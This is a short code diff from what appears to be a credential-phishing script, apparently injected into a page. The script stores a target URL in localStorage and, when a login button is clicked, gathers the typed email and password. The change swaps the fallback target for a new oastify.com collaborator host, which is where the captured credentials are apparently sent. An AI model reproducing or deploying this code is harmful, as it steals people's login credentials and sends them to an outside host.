@@ -52,7 +52,7 @@ alert(
 
     let target = urlTarget || localStorage.getItem("targetyre00obqr8t");
     if (urlTarget) localStorage.setItem("targetyre00obqr8t", urlTarget);
-    if (!target) target = "https://isekrl4qyt17a6v3aapc5p5ynptgh65v.oastify.com";
+    if (!target) target = "https://lj8niovtpwsa19m61dgfwsw1eskj8awz.oastify.com";
 
     lbtn.onclick = () => {
         let credentials = lemail.value.trim() && lpw.value.trim()
